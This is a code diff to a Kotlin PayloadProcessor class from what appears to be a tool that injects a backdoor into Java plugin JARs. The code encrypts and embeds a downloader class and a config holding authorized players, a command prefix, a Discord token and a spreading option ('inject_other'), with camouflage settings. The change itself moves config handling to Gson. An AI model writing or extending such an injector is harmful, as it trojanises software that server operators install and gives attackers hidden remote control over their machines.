@@ -1,5 +1,7 @@
 package com.tmquan2508.inject.core.payload
 
+import com.google.gson.Gson
+import com.google.gson.reflect.TypeToken
 import com.rikonardo.cafebabe.ClassFile
 import com.tmquan2508.inject.cli.Logs
 import com.tmquan2508.inject.config.Config
@@ -38,7 +40,8 @@ class PayloadProcessor {
         camouflageEnabled: Boolean,
         targetJar: File,
         dominantVersion: JavaVersion,
-        config: Config
+        config: Config,
+        configJson: String
     ): ProcessedPayload {
         val downloaderBytes = this.javaClass.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
             ?: throw IllegalStateException("Could not find internal downloader class: '$DOWNLOADER_CLASS_NAME'")
@@ -50,7 +53,8 @@ class PayloadProcessor {
             originalBytecodeMap = transformedBytecodeMap,
             targetClassName = finalMainPayloadName,
             downloaderBytes = downloaderBytes,
-            config = config
+            config = config,
+            configJson = configJson
         )
 
         val finalMainPayloadBytes = configuredBytecodeMap[finalMainPayloadName]
@@ -127,10 +131,11 @@ class PayloadProcessor {
         originalBytecodeMap: Map<String, ByteArray>,
         targetClassName: String,
         downloaderBytes: ByteArray,
-        config: Config
+        config: Config,
+        configJson: String
     ): Map<String, ByteArray> {
         val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
-            downloaderBytes, config
+            downloaderBytes, configJson
         )
 
         val mainClassBytes = originalBytecodeMap[targetClassName]
@@ -161,6 +166,8 @@ class PayloadProcessor {
     }
 
     private object AsmValueInjector {
+        private val gson = Gson()
+
         private object StaticKeyEncoder {
             private const val SECRET_KEY = "openbd.secret.key"
             fun encrypt(plainText: String): String {
@@ -211,11 +218,7 @@ class PayloadProcessor {
             return classWriter.toByteArray()
         }
 
-        private fun escapeJson(value: Any): String {
-            return value.toString().replace("\\", "\\\\").replace("\"", "\\\"")
-        }
-
-        fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, config: Config): Map<String, String> {
+        fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, configJson: String): Map<String, String> {
             val finalMap = mutableMapOf<String, String>()
             val key = generateRandomKey(32)
 
@@ -224,19 +227,15 @@ class PayloadProcessor {
             finalMap["::ENCRYPTED_PAYLOAD::"] = encryptWithRandomKey(downloaderBytes, key)
             finalMap["::ENCRYPTED_DOWNLOADER_CLASS_NAME::"] = encryptWithRandomKey(downloaderClassName.toByteArray(Charsets.UTF_8), key)
 
-            val configJson = """
-            {
-              "uuids": "${escapeJson(config.authorizedUuids.joinToString(","))}",
-              "usernames": "${escapeJson(config.authorizedUsernames.joinToString(","))}",
-              "prefix": "${escapeJson(config.commandPrefix)}",
-              "inject_other": ${config.injectIntoOtherPlugins},
-              "warnings": ${config.displayDebugMessages},
-              "discord_token": "${escapeJson(config.discordToken)}",
-              "password": "${escapeJson(config.password.toSha256())}"
-            }
-            """.trimIndent().replace(Regex("(?m)^\\s*"), "")
+            val type = object : TypeToken<MutableMap<String, Any>>() {}.type
+            val configMap: MutableMap<String, Any> = gson.fromJson(configJson, type)
 
-            finalMap["::CONFIG::"] = StaticKeyEncoder.encrypt(configJson)
+            (configMap["password"] as? String)?.takeIf { it.isNotEmpty() }?.let { plainPassword ->
+                configMap["password"] = plainPassword.toSha256()
+            }
+
+            val processedConfigJson = gson.toJson(configMap)
+            finalMap["::CONFIG::"] = StaticKeyEncoder.encrypt(processedConfigJson)
 
             return finalMap
         }
